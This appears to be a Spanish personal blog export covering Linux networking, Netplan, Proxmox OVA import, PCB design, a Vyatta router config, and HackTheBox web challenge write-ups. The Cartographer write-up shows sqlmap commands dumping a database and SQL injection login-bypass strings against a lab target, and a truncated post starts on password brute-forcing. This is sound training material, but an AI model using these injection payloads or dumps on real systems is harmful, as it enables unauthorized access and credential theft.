ip neigh show En la ultima columna nos muestra el estado del vecino, que puede ser uno de estos estados:\nREACHABLE: la entrada ARP es válida y hay conectividad. STALE: la entrada ARP es válida pero no hay conectividad. FAILED: no hay conectividad y la MAC no ha sido detectada. DELAY: a la espera de confirmación tras el envío de un paquete. También puede ser muy interesante poner fija la tabla ARP para evitar que nos puedan hacer MAC Spofing, esto se realiza con:\n1 2 3 4 5 6 7 8 # Para evitar conflictos hay que bajar la interfaz o quitarle la IP sudo ip addr flush dev enp0s3 # Asignamos la MAC asociada a la IP sudo ip neigh add 192.168.1.1 lladdr d0:6e:d5:54:3d:a4 nud permanent dev enp0s3 # Volvemos a solicitar las IPs sudo netplan apply Para borrar una entrada sería:\n1 sudo ip neigh del 192.168.1.1 dev enp0s3 Para vaciar la tabla ARP o borrar una única entrada sería:\n1 2 sudo ip -s -s neigh flush all sudo ip -s -s neigh flush 192.168.1.1 Fuentes: 0, 1\nConfiguración del dispositivo MACsec MACsec es un estándar IEEE (IEEE 802.1AE) para seguridad MAC, introducido en 2006. Define una forma de establecer una conexión independiente de protocolo entre dos hosts con confidencialidad, autenticidad y/o integridad de datos, utilizando GCM-AES-128. MACsec opera en la capa Ethernet y, como tal, es un protocolo de capa 2, lo que significa que está diseñado para proteger el tráfico dentro de una red de capa 2, incluidas las solicitudes DHCP o ARP. No compite con otras soluciones de seguridad como IPsec (capa 3) o TLS (capa 4), ya que todas esas soluciones se utilizan para sus propios casos de uso específicos.\nIMPORTANTE: NO LO HE PROBADO AÚN\n1 sudo ip link add macsec0 link eth1 type macsec Fuentes: 0\nEnrutamiento Una ruta estática no es más que una forma de especificar el tráfico que no debe pasar por la puerta de enlace predeterminada. Se puede usar el comando ip para agregar una ruta estática a una red diferente a la que no se puede acceder a través de su puerta de enlace predeterminada. Por ejemplo, la puerta de enlace VPN.\nVer rutas del sistema Podemos ver cuales son las rutas por defecto del sistema con el comando ip route.\n1 ip route show También se puede hacer un mayor debug solicitando al sistema que te diga cual es la IP e interfaz por la que saldrá un paquete indicando la IP destino. (Ojo, no es capaz de resolver un FQND).\n1 2 3 ip route get 192.168.1.1 ip route get 8.8.8.8 Añadir rutas estáticas La sintaxis para añadir rutas estáticas es la siguiente:\nip route add {NETWORK/MASK} via {GATEWAYIP}\nip route add {NETWORK/MASK} dev {INTERFACE}\nip route add default {NETWORK/MASK} dev {INTERFACE}\nip route add default {NETWORK/MASK} via {GATEWAYIP}\nPor ejemplo a continuación se puede ver como se enruta el trafico de una red por la interfaz vlan.100 y como se envía en trafico para un host por la interfaz enp0s3.\n1 2 3 4 5 # RED sudo ip route add 192.168.20.0/24 via 192.168.10.10 dev vlan.100 # HOST sudo ip route add 192.168.20.5 via 192.168.10.10 dev enp0s3 Borrar rutas estaticas La sintaxis para añadir rutas estáticas es la siguiente:\nsudo ip route add default via {NETWORK/MASK} dev {INTERFACE}\nsudo ip route del default\n1 2 3 sudo ip route del 192.168.20.0/24 via 192.168.10.10 dev vlan.100 sudo ip route del default Hacer persistentes las rutas Los comandos mencionados anteriormente son volatiles, y cuando sereinicia el ordenador se borrar. Se podrian hacer las rutas persistentes de la siguiente forma:\nEnrutamiento persistentes en (RHEL, Fedora, CentOS) En el directorio /etc/sysconfig/network-scripts/ hay que crear un fichero por cada interfaz de host, donde el nombre del fichero sera el nombre de la interfaz. En nuestro caso, esto será route-enp0s3.\nEn nuestro caso hay que añadir al fichero /etc/sysconfig/network-scripts/route-enps03 las siguientes lineas:\n1 2 10.0.2.0/32 via 192.168.43.1 10.0.2.15 via 192.168.43.1 Guardamos el fichero y reiniciamos el servicio NetworkManager:\n1 sudo systemctl restart NetworkManager Fuentes: 0, 1\nEnrutamiento persistentes en (Debian, Ubuntu) PENDIENTE DE ESCRIBIR CON NETPLAN\nDomain Name System o DNS cat /etc/resolv.conf\nsudo ss -lpunta\nsystemd-resolve \u0026ndash;status\ndig www.mytcip.com para ver el server 127.0.0.53\nsystemd-resolve \u0026ndash;statistics sudo systemd-resolve \u0026ndash;flush-caches systemd-resolve \u0026ndash;statistics\nPOSIBLEMENTE LA PARTE DE CONFIGURACION DE DNS VAYA EN NETPLAN\nhttps://wiki.archlinux.org/index.php/Systemd-resolved_(Espa%C3%B1ol)\nsudo apt install resolvconf https://www.systeminside.net/como-soluciono-resolucion-dns-ubuntu/\nhttps://moss.sh/es/configuracion-problematica-systemd-resolved/\nip COMMAND Cheat Sheet for Red Hat Enterprise Linux\n","date":"2020-03-15T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/linux_troubleshooting/","title":"Linux troubleshooting"},{"content":"Netplan es la nueva utilidad de Linux para la configuración de red de los sistemas. Se basa en crear un fichero de texto siguiendo las especificaciones YAML. Este fichero tiene que estar ubicado en el directorio /etc/netplan. Por defecto se crea el fichero 50-cloud-init.yaml que tendrá la primera interfaz puesta en DHCP, a no ser que durante la instalación se haya indicado lo contrario.\nEs importante destacar que YAML no funciona bien con tabuladores y que aunque no hay una especificación formal de como formatear los ficheros, mi recomendación de usar espacios y que cada subsección este separada por dos espacios del padre. También indicar que permite un formato amplio a la hora de especificar las configuraciones, muchas veces se pueden indicar en formato lineal o multi-lineal.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;50%\u0026rdquo;}\nPara modificar las interfaces, lo recomendable es cambiar la extensión de ese fichero, para que netplan no lo reconozca y crear uno nuevo, por ejemplo 01-netcfg.yaml. Este fichero es el que debería de tener toda la configuración de las interfaces, aunque se puede crear un fichero diferente por cada interfaz.\nSi se tiene la misma interfaz en distintos ficheros y se les asignan IPs en cada uno, se crearan varias IPs virtuales.\nHay que tener en cuenta que netplan admite dos formas de configurar el host:\nNetworkManager: que será utilizado cuando disponemos de entorno gráfico o dejamos que este se encarga de la configuración. Systemd-networkd: será usando cuando no disponemos de entorno gráfico o cuando hacemos la configuración manualmente. A continuación se puede ver un ejemplo de como se especifica estas formas:\n1 2 3 4 5 6 7 8 9 # Opción Network Manager network: version: 2 renderer: NetworkManager # Opción Systemd-networkd network: version: 2 renderer: networkd IPv4 A continuación se muestra un ejemplo de un fichero de configuración con tres interfaces. La configuración de estas interfaces también se ven en la siguiente tabla:\nINTERFAZ IP VLAN enp0s3 10.0.2.16 No enp0s8 192.168.10.11 100 enp0s9 DHCP No 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 # This file describe the network interfaces avaliable on your system # For more information, see netplan(5) network: version: 2 renderer: networkd ethernets: # IP FIJA enp0s3: dhcp4: no dhcp6: no addresses: [10.0.2.16/24] gateway4: 10.0.2.2 nameservers: search: [localhost] addresses: [1.1.1.1, 9.9.9.9] 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 # This file describe the network interfaces avaliable on your system # For more information, see netplan(5) network: version: 2 renderer: networkd ethernets: # IP con VLAN enp0s8: {} # IP con DHCP vlans: vlans.100: ip: 100 link: enp0s8 addresses: [192.168.10.11/24] 1 2 3 4 5 6 7 8 9 # This file describe the network interfaces avaliable on your system # For more information, see netplan(5) network: version: 2 renderer: networkd ethernets: enp0s9: dhcp4: true El fichero completo seria el siguiente:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 # This file describe the network interfaces avaliable on your system # For more information, see netplan(5) network: version: 2 renderer: networkd ethernets: # IP FIJA enp0s3: dhcp4: no dhcp6: no addresses: [10.0.2.16/24] gateway4: 10.0.2.2 nameservers: search: [localhost] addresses: [1.1.1.1, 9.9.9.9] # IP con VLAN enp0s8: {} # IP con DHCP enp0s9: dhcp4: true vlans: vlans.100: ip: 100 link: enp0s8 addresses: [192.168.10.11/24] IPv6 También se puede configurar direcciones IPv6, la configuración es prácticamente la misma, solo hay que tener en cuenta dos cambios:\nEl formato en el que se introducen las direcciones IP en vez de colocarse en una única linea, tienen que hacerse en una linea por dirección IP. La dirección IPv6 tiene que colocarse dentro de comillas. Estos cambios no se porque son necesarios, pero es de la única forma que me ha funcionado en las pruebas realizadas.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 # This file describe the network interfaces avaliable on your system # For more information, see netplan(5) network: version: 2 renderer: networkd ethernets: # IP FIJA enp0s3: dhcp4: no dhcp6: no addresses: - 10.0.2.16/24 - \u0026#34;3bb7::15/64\u0026#34; gateway4: 10.0.2.2 gateway6: \u0026#34;3fb7::1\u0026#34; nameservers: search: [localhost] addresses: [1.1.1.1, 9.9.9.9] # IP con VLAN enp0s8: {} # IP con DHCP enp0s9: dhcp4: true vlans: vlans.100: ip: 100 link: enp0s8 addresses: [192.168.10.11/24] Si no se va a usar IPv6 lo mas recomendable es desactivarlo, esto se puede hacer con los siguientes comandos de forma termporal\n1 2 sudo sysctl -w net.ipv6.conf.all.disable_ipv6=1 sudo sysctl -w net.ipv6.conf.default.disable_ipv6=1 Para hacer os cambios persistentes habría que añadir en el fichero /etc/sysctl.conf las siguientes lineas:\n1 2 net.ipv6.conf.all.disable_ipv6=1 net.ipv6.conf.default.disable_ipv6=1 Aplicar cambios Una vez que se ha realizado la configuración necesaria, se puede comprobar que el fichero esta correctamente escrito y aplicar los cambios con los siguientes comandos:\n1 2 3 4 5 # Comprobar la configuración netplan --debug generate # Aplicar los cambios netplan --debug apply Fuentes Fuentes: 1, 2, 3\n","date":"2020-03-15T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/netplan/","title":"Netplan"},{"content":"Para convertir una ova generada por Virtualbox o equivalentes en una imagen valida para Proxmox, hay que realizar una serie de pasos, que serian los siguientes:\nLo primero que hay que tener en cuenta es que una ova es un archivo tar que contiene tres ficheros\narch-disk001.vmdk: Contiene el disco. arch.mf: Contiene los hash de los otros dos ficheros. arch.ovf: Contiene la información de la máquina, para importarla con los mismos ajustes. El primer paso sera enviar la ova al servidor, esto se puede hacer fácilmente con el comando scp\n1 scp arch.ova root@192.168.1.254:~ Una vez que ya tenemos la máquina dentro de Proxmox tendremos que descomprimir la ova.\n1 tar xf arch.ova A Partir de este punto tenemos dos métodos para proceder, el primero método es el mas automático, ya que se puede hacer prácticamente todo por consola, en segundo método requiere de interfaz gráfica.\nMétodo 1 (Pendiente de testear) Lo primero es saber cual va a ser el VMid de la máquina, para saber cual es el siguiente podemos verlo gráficamente o con el comando qm list. Una vez que sabemos el id lo que haremos sera indicarlo en la variable de entorno para que lo usen los siguientes comandos.\nEl primer paso sera convertir el disco de formato vmdk a formato qcow2. Además este comando ya deja el disco en la ruta que usará la máquina virtual cuando se cree.\n1 2 3 4 5 6 7 VMID=115 qemu-img convert \\ -f vmdk \\ -O qcow2 \\ arch-disk001.vmdk \\ /var/lib/vz/images/$VMID/vm-$VMID-disk-1.qcow2 Una vez que esta creado el disco en su ruta unicamente sera necesario crear la máquina usando este disco. En general se puede modificar este comando para que se ajuste mas a los requisitos de la máquina final, pero personalmente me parece mas cómodo y seguro hacerlo gráficamente una vez que este creada.\n1 2 3 4 5 6 7 8 9 10 11 12 NAME=\u0026#34;arch\u0026#34; qm create $VMID \\ --name $NAME \\ --net0 virtio,bridge=vmbr0 \\ --bootdisk virtio0 \\ --ostype l26 \\ --memory 1024 \\ --onboot no \\ --sockets 1 \\ --cores 1 \\ --virtio0 local:$VMID/vm-$VMID-disk-1.qcow2 Una vez hecho esto solo seria necesario ajustar la configuración y arrancar la máquina para probar su correcto funcionamiento.\nMétodo 2 Este método es el que he estado usando y funciona por el momento bastante bien, la diferencia con el otro reside en donde se guardan las imágenes, en este se guardan en local-lvm mientras que en otro se guardan en el disco local. Además este proceso es mas gráfico y por lo tanto mas lento.\nEl primero paso consiste en crear una máquina, se puede hacer gráficamente o con el comando mostrado anteriormente. Lo importante de este paso es que el disco que se crea hay que hacerle deteach y despues borrarlo, ya que no lo vamos a usar.\nCONFIRMAR QUE ESTE COMANDO FUNCIONA BIEN SI PONER EL DISCO 1 2 3 4 5 6 7 8 9 10 11 12 VMID=115 NAME=\u0026#34;arch\u0026#34; qm create $VMID \\ --name $NAME \\ --net0 virtio,bridge=vmbr0 \\ --bootdisk virtio0 \\ --ostype l26 \\ --memory 1024 \\ --onboot no \\ --sockets 1 \\ --cores 1 Una vez que se ha borrado el disco de la imagen, el siguiente paso sera importar el nuevo disco, esto se realiza con el siguiente comando:\n1 2 3 4 5 6 VMID=115 qm importdisk $VMID \\ arch-disk001.vmdk \\ local-lvm -format qcow2 Finalmente el disco aparece gráficamente, pero no esta conectado con la máquina, es necesario editarlo y darle a aplicar para que se registre accesible para la máquina. También seria posible editar el tipo de conectar usando y ponerlo como SATA o IDE.\nUn dato interesante es la ruta donde se guardan los fichero ISOs subidos gráficamente, esta ruta es: /var/lib/vz/template/sio/\n","date":"2020-03-08T00:00:00Z","image":"https://www.procamora.com/covers/htb.png","permalink":"https://www.procamora.com/p/import_ova_proxmox/","title":"Import ova proxmox"},{"content":"A continuación se va a explicar como diseñar un circuito para poder crear un PCB usando el método del planchado. Este método consiste en imprimir el circuito en un papel fotográfico para posteriormente plancharlo en una plaqueta de cobre y después mediante el uso de un ácido eliminar las partes de cobre sobrantes. Se va a partir que se tiene el circuito diseñado y creado el PCB.\nRevisión del esquema Es recomendable realizar una serie de revisiones en el esquema para prevenir posibles errores, están son las siguientes:\nRevisar haciendo zoom para asegurarse que todos las conexiones están realizadas correctamente. Si hay pines no usados marcarlos como \u0026ldquo;not used\u0026rdquo;. Poner una etiqueta en los cables para hacer mas sencilla la revisión posterior del PCB. Revisión en el PCB La revisión del PCB es obligatoria antes de imprimar el PCB ya que un fallo en esta parte conllevaría una perdida de horas de trabajo.\nRevisar que el autoruteo del PCB se ha realizado correctamente. Revisar que todas las lineas tienen ángulos de 45° como máximo, modificando aquellas que puedan tener ángulos de 90°, ya que no es recomendable. Regenerar la capa de tierra, por si se ha realizado alguna modificación. Revisar que no hay errores en el PCB, esto se puede revisar en Design manager \u0026gt; DRC Errors. Cambiar orificios de los componentes siguiendo la siguiente tabla. Esto se debe a que aunque en el esquema salen con el orificio correcto, al crear el PCB de forma casera es recomendable modificarlos para facilitar la realización de los agujeros con la broca. Componente Orificio original Orificio optimo Componentes 1/8W 0.8mm 0.6mm Encapsulados TO-92 0.8mm 0.6mm Encapsulados DIP-8 0.8mm 0.6mm Componentes 1/4W 1mm 0.8mm Reles pequeño 1mm 0.8mm Reles grandes Conectores 1mm Exportar el PCB Para exportar hay que tener en cuenta el diseño del PCB, si se ha creado el PCB en la capa superior (no recomendable) sera necesario exportarlo en modo espejo, en nuestro caso se va a partir de que se ha diseñado el conexionado en la capa inferior y en la capa superior solo esta la serigrafía de los componentes, ahorrando que sea necesario exportarlo en modo espejo.\nLa exportación seria en formato PDF y las capas que habría que exportar son las siguientes:\nCapas Capa inferior Bordes de placa Multi-Layer Orificio Como recomendación esta en usar como motor el ordenador local, haciendo que tarde bastante menos tiempo que si se genera el PDF por el servidor.\nA continuación podemos ver una imagen de la ventana de exportación:\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nImpresión del PCB Para imprimir en papel fotográfico es recomendable seguir estas recomendaciones:\nRealizar un limpiado de los cabezales de la impresora, ya que se necesita que la imagen sea precisa. Configurar la impresora para que use papel A6, con el objetivo de poder aprovechar ese papel para otras impresiones. Configurar el papel como grueso, para que caliente mas el papel y se obtenga mejor impresión. Configurar la resolución en alta (1200 Res) ","date":"2019-12-29T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/diseno_de_un_pcb_con_easyeda/","title":"Diseño de un PCB con EasyEDA"},{"content":" 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 show interfaces configure # Enable SSH for remote management: set service ssh port 22 # Configure network interfaces IPv4 set interfaces ethernet eth0 address dhcp set interfaces ethernet eth0 description \u0026#39;WAN\u0026#39; set interfaces ethernet eth0 duplex full set interfaces ethernet eth0 speed 100 set interfaces ethernet eth1 address 10.1.1.1/24 set interfaces ethernet eth1 description \u0026#39;LAN\u0026#39; set interfaces ethernet eth1 duplex full set interfaces ethernet eth1 speed 100 set interfaces ethernet eth2 address 10.1.2.1/24 set interfaces ethernet eth2 description \u0026#39;DMZ\u0026#39; set interfaces ethernet eth2 duplex full set interfaces ethernet eth2 speed 100 # Configure network interfaces IPv4 #set interfaces ethernet eth3 address address 10.1.3.1/30 set interfaces ethernet eth3 description \u0026#39;IPS Port Mirroning\u0026#39; set interfaces ethernet eth3 duplex full set interfaces ethernet eth3 speed 100 set interfaces ethernet eth3 vif 5 description \u0026#39;VLAN 5 IPS Port Mirroning\u0026#39; set interfaces ethernet eth3 vif 5 address 10.1.3.1/30 set interfaces ethernet eth1 mirror eth3 # Mirror de eth1 a eth3 (IPS) set interfaces ethernet eth2 mirror eth3 # Mirror de eth2 a eth3 (IPS) commit # Configure network interfaces IPv6 set interfaces ethernet eth1 address 3fb7::1/64 set interfaces ethernet eth1 ipv6 router-advert send-advert true set interfaces ethernet eth1 ipv6 router-advert max-interval 10 set interfaces ethernet eth1 ipv6 router-advert prefix 3fb7::/64 set interfaces ethernet eth1 ipv6 router-advert other-config-flag true set interfaces ethernet eth1 ipv6 router-advert default-preference medium set interfaces ethernet eth1 ipv6 router-advert managed-flag true commit # Configure Source NAT for our \u0026#34;Inside\u0026#34; network. Ponwe un /16 no funciona set nat source rule 100 outbound-interface eth0 set nat source rule 100 source address 10.1.1.0/24 set nat source rule 100 translation address masquerade set nat source rule 101 outbound-interface eth0 set nat source rule 101 source address 10.1.2.0/24 set nat source rule 101 translation address masquerade set nat source rule 102 outbound-interface eth0 set nat source rule 102 source address 10.1.3.0/30 set nat source rule 102 translation address masquerade commit # Configure a DHCP Server IPv4: set service dhcp-server shared-network-name LAN authoritative set service dhcp-server shared-network-name LAN subnet 10.1.1.0/24 default-router 10.1.1.1 set service dhcp-server shared-network-name LAN subnet 10.1.1.0/24 dns-server 1.1.1.1 set service dhcp-server shared-network-name LAN subnet 10.1.1.0/24 dns-server 9.9.9.9 set service dhcp-server shared-network-name LAN subnet 10.1.1.0/24 lease 86400 set service dhcp-server shared-network-name LAN subnet 10.1.1.0/24 range 0 start 10.1.1.100 set service dhcp-server shared-network-name LAN subnet 10.1.1.0/24 range 0 stop 10.1.1.200 set service dhcp-server shared-network-name LAN description \u0026#39;DHCP LAN IPv4\u0026#39; commit # Configure a DHCP Server IPv6: set service dhcpv6-server shared-network-name LAN subnet 3fb7::/64 address-range start 3fb7::10 stop 3fb7::100 set service dhcpv6-server shared-network-name LAN subnet 3fb7::/64 name-server 3fb7::1 commit # And a DNS forwarder: set service dns forwarding cache-size 0 set service dns forwarding allow-from 10.1.1.0/24 set service dns forwarding listen-address 10.1.1.1 set service dns forwarding name-server 1.1.1.1 set service dns forwarding name-server 9.9.9.9 # Apply and save commit save Add a set of firewall policies for our \u0026ldquo;Outside\u0026rdquo; interface:\nset firewall name OUTSIDE-IN default-action \u0026lsquo;drop\u0026rsquo; set firewall name OUTSIDE-IN rule 10 action \u0026lsquo;accept\u0026rsquo; set firewall name OUTSIDE-IN rule 10 state established \u0026rsquo;enable' set firewall name OUTSIDE-IN rule 10 state related \u0026rsquo;enable'\nset firewall name OUTSIDE-LOCAL default-action \u0026lsquo;drop\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 10 action \u0026lsquo;accept\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 10 state established \u0026rsquo;enable' set firewall name OUTSIDE-LOCAL rule 10 state related \u0026rsquo;enable' set firewall name OUTSIDE-LOCAL rule 20 action \u0026lsquo;accept\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 20 icmp type-name \u0026rsquo;echo-request' set firewall name OUTSIDE-LOCAL rule 20 protocol \u0026lsquo;icmp\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 20 state new \u0026rsquo;enable' set firewall name OUTSIDE-LOCAL rule 30 action \u0026lsquo;drop\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 30 destination port \u0026lsquo;22\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 30 protocol \u0026rsquo;tcp' set firewall name OUTSIDE-LOCAL rule 30 recent count \u0026lsquo;4\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 30 recent time \u0026lsquo;60\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 30 state new \u0026rsquo;enable' set firewall name OUTSIDE-LOCAL rule 31 action \u0026lsquo;accept\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 31 destination port \u0026lsquo;22\u0026rsquo; set firewall name OUTSIDE-LOCAL rule 31 protocol \u0026rsquo;tcp' set firewall name OUTSIDE-LOCAL rule 31 state new \u0026rsquo;enable'\nApply the firewall policies:\nset interfaces ethernet eth0 firewall in name \u0026lsquo;OUTSIDE-IN\u0026rsquo; set interfaces ethernet eth0 firewall local name \u0026lsquo;OUTSIDE-LOCAL\u0026rsquo;\nOnce suricata is installed and inspecting nfqueue 0 (-q 0), you can send packet to it by passing the action “inspect” to a firewall rule:\nset firewall name FROM-INTERNET default-action drop set firewall name FROM-INTERNET description “From Internet” set firewall name FROM-INTERNET rule 10 description “Pass port 22 traffic to Suricata” set firewall name FROM-INTERNET rule 10 action inspect set firewall name FROM-INTERNET rule 10 protocol tcp set firewall name FROM-INTERNET rule 10 destination port ssh\nand this will send packets to nfqueue 0\n","date":"2019-12-05T00:00:00Z","image":"https://www.procamora.com/covers/draft.png","permalink":"https://www.procamora.com/p/vyatta/","title":"Vyatta"},{"content":"\nLa descripción del reto es la siguiente:\nSome underground hackers are developing a new command and control server. Can you break in and see what they are up to?\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nCon esta información no obtenemos ninguna pista de por donde empezar, por lo que la primera opción sera usar un ataque de fuerza bruta al login, pero lamentablemente no se ha conseguido obtener nada con varios diccionarios utilizados.\nEl segundo paso es probar con SQL Injection, ya que puede ser que funcione, para esto primero se probará con la herramienta sqlmap, que permite automatizar este proceso.\nPara esto es necesario hacer primero un login y ver cual es la url a la que se envían los parámetros del POST. Se puede ver que se envía a la raíz y que los parámetros son username y password. Con esta información ya se puede ejecutar la herramienta, podemos ver la ejecución a continuación:\nLa primera consulta que se ejecutará será para intentar obtener todas las bases de datos disponibles, esto se realiza con el siguiente comando:\n1 sqlmap -u http://docker.hackthebox.eu:32093/index.php --data=\u0026#34;username=a\u0026amp;password=b\u0026#34; -p \u0026#34;username\u0026#34; --method POST --level=5 --risk=3 --batch --dbs Obteniendo la siguientes bases de datos, esta claro que la que nos interesa es cartographer, por lo que el siguiente paso es obtener las tablas de esa base de datos.\n1 2 3 4 5 6 available databases [5]: [*] cartographer [*] information_schema [*] mysql [*] performance_schema [*] sys Para obtener las tablas de la base de datos cartographer ejecutaremos el siguiente comando:\n1 sqlmap -u http://docker.hackthebox.eu:32093/index.php --data=\u0026#34;username=a\u0026amp;password=b\u0026#34; -p \u0026#34;username\u0026#34; --method POST --level=5 --risk=3 --batch -D cartographer --tables La única tabla de la base de datos es users, por lo que ahora sería necesario ver los usuarios de esta tabla.\n1 2 3 4 5 6 users Database: cartographer [1 table] +-------+ | users | +-------+ Para obtener los usuarios, se va a realizar un dump de la base de datos:\n1 sqlmap -u http://docker.hackthebox.eu:32093/index.php --data=\u0026#34;username=a\u0026amp;password=b\u0026#34; -p \u0026#34;username\u0026#34; --method POST --level=5 --risk=3 --batch -D cartographer --dump Con lo que obtendríamos las credenciales del único usuario que hay creado, que como se puede ver no esta preparado para sacar por fuerza bruta.\n1 2 3 4 5 6 7 8 Database: cartographer Table: users [1 entry] +------------------------------+----------+ | password | username | +------------------------------+----------+ | mypasswordisfuckinawesome123 | admin | +------------------------------+----------+ Toda la información anterior se puede obtener unicamente con el siguiente comando:\n1 sqlmap -u http://docker.hackthebox.eu:32093/index.php --data=\u0026#34;username=a\u0026amp;password=b\u0026#34; -p \u0026#34;username\u0026#34; --method POST --level=5 --risk=3 --batch --dbs --dump Además hemos obtenido la base de datos que hay, que podría ser usada para buscar alguna vulnerabilidad, esta base de datos es:\n1 2 [21:53:25] [INFO] the back-end DBMS is MySQL back-end DBMS: MySQL \u0026gt;= 5.0.12 Otra forma más rápida de conseguir un login correcto sería usar directamente SQL Injection sobre el formulario, por ejemplo se podrían poner cualquiera de las tres sentencias en usuario y contraseña:\n1 2 3 \u0026#39;||\u0026#39;1\u0026#39;=\u0026#39;1 \u0026#39;or\u0026#39;1\u0026#39;=\u0026#39;1 aaa\u0026#39; OR \u0026#39;1\u0026#39;=\u0026#39;1 Una vez puesto un login valido nos redireccionará a la url http://docker.hackthebox.eu:32093/panel.php?info=home, si la analizamos un poco, veremos que usa el fichero panel.php y luego recibe como parámetro info=home.\nSi usamos comandos como dirb para buscar ficheros y directorios en la web, no se conseguira nada.\nJugando con el parámetro info= vemos que obtenemos un Not Found!, por lo que puede que estemos acercándonos al objetivo.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nDado que es un CTF y se busca un flag, se prueba a poner info=flag y justamente obtenemos el flag.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\n","date":"2019-12-01T00:00:00Z","image":"https://www.procamora.com/covers/htb.png","permalink":"https://www.procamora.com/p/ecartographer-writeup-hackthebox-web-challenge/","title":"Cartographer Writeup HackTheBox Web Challenge"},{"content":"La descripción del reto es la siguiente:\n1 Can you encrypt fast enough? Al acceder a la web vemos que nos da un string y nos pide que lo cifremos en MD5 y lo enviemos.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nSi lo enviamos con el navegador vemos que nos dice Too slow!, por lo que se puede suponer que es necesario realizar un script que haga esta acción para realizarlo de forma mas rápida.\nSi analizamos el trafico vemos que unicamente se envía un POST en el que el form contiene el hash del string proporcionado, por lo que en principio solo sera necesario realizar un GET a la web para obtener el string, calcular el hash y realizar un POST para capturar la respuesta y obtener el flag, pero esta primera prueba no ha funcionado, por lo que se ha realizado un análisis mas detallado del tráfico.\n{:height=\u0026ldquo;auto\u0026rdquo; width=\u0026ldquo;100%\u0026rdquo;}\nSi analizamos la cabecera vemos que hay un campo para cookies, tanto en el GET como en el POST, por lo que este puede ser el motivo por el que falle el POST.\nCookie pair: PHPSESSID=fnroeunk08h8hl7v0ubhn4bcr6 Finalmente se actualiza el código para tener en cuenta los cookies en el POST y se realiza la petición. El código que realiza esta acción se puede ver a continuación:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 #!/usr/bin/env python3 # -*- coding: utf-8 -*- import requests import hashlib import re regex = \u0026#34;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;(.*)\u0026lt;/h3\u0026gt;\u0026#34; def encrypt_md5(string: str) -\u0026gt; str: result = hashlib.md5(string.encode()) return result.hexdigest() # Get a la web para obtener el valor a cifrar response = requests.get(\u0026#39;http://docker.hackthebox.eu:32246/\u0026#39;) # Creacon de la peticion post response_regex = re.search(regex, response.text) form = {\u0026#39;hash\u0026#39;: encrypt_md5(response_regex.group(1))} response_post = requests.post(\u0026#39;http://docker.hackthebox.eu:32246/\u0026#39;, data=form, cookies=response.cookies) print(response_post) print(response_post.text) Al ejecutarlo se obtiene la siguiente salida, en la que se puede ver el flag. Cabe destacar que este código se ha ejecutado varias veces y en alguna ocasión ha indicado que has sido muy lento, por lo que el timeout es muy bajo.\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;title\u0026gt;emdee five for life\u0026lt;/title\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body style=\u0026#34;background-color:powderblue;\u0026#34;\u0026gt; \u0026lt;h1 align=\u0026#39;center\u0026#39;\u0026gt;MD5 encrypt this string\u0026lt;/h1\u0026gt;\u0026lt;h3 align=\u0026#39;center\u0026#39;\u0026gt;d3FXG8iZJs19dw6HkUXi\u0026lt;/h3\u0026gt;\u0026lt;p align=\u0026#39;center\u0026#39;\u0026gt;HTB{N1c3_ScrIpt1nG_B0i!}\u0026lt;/p\u0026gt;\u0026lt;center\u0026gt;\u0026lt;form action=\u0026#34;\u0026#34; method=\u0026#34;post\u0026#34;\u0026gt; \u0026lt;input type=\u0026#34;text\u0026#34; name=\u0026#34;hash\u0026#34; placeholder=\u0026#34;MD5\u0026#34; align=\u0026#39;center\u0026#39;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/br\u0026gt; \u0026lt;input type=\u0026#34;submit\u0026#34; value=\u0026#34;Submit\u0026#34;\u0026gt;\u0026lt;/input\u0026gt; \u0026lt;/form\u0026gt;\u0026lt;/center\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; ","date":"2019-12-01T00:00:00Z","image":"https://www.procamora.com/covers/htb.png","permalink":"https://www.procamora.com/p/emdee-five-for-life-writeup-hackthebox-web-challenge/","title":"Emdee five for life Writeup HackTheBox Web Challenge"},{"content":"La descripción del reto es la siguiente:\nYour target is not very good with computers. Try and guess their password to see if they may be hiding anything!\nCon esta descripción podemos entender que podemos adivinar la contraseña, por lo que debería de estar en un diccionario de las contraseñas mas utilizadas. Por este motivo se realizará un ataque de fuerza bruta, para realizarlo podemos usar tres herramientas diferentes: Hydra, Burp Suite y un script propio.\n{:height=\u0026ldquo;auto\u0026rdquo; 